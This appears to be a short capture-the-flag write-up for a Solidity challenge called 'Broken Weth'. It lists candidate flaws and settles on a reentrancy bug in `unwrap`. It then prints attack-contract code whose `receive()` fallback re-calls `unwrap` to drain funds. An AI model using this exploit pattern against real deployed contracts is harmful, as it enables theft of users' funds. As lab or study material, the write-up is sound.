# Broken Weth

Initial thoughts on possible vulnerability:
- [ ] OZ Address lib known constructor vulnerability
- [ ] `balanceOf` public map comes w/ getter used by `borrow` func in the `LendBrokenWeth` HOWEVER `IBrokenWeth` comes with interface for `balanceOf` Perhaps override opportunity?

- [x] `unwrap` function transfers funds before updating ledger
  - [x] Within the `unwrap` function there is a `Address.sendValue` TX. The code base warns of a reentrancy attack here
  - [x] Possibly use a dummy contract w/ a fallback function to recall `unwarp` and drain funds. 
- [ ] How can we insert an overriden balance check in `borrow` func that always returns `before` value (or ten)?

## The Plan

- [x] Create attacking contract w/
  - [x] Receive fall back func


## The Solution:

The meat and potatoes of the attack contract:

```
function attack() payable external {
        require(msg.value == 10 ether);
        WETH.deposit{value: 10 ether}();
        WETH.unwrap();
    }

    receive() external payable {
        if(toggle) {
            toggle = false;
            WETH.unwrap();
        }
    }
```

We pass in 10 eth to fulfill the requirments and use the vulnerability within the `unwrap` function to create a reentrant hack.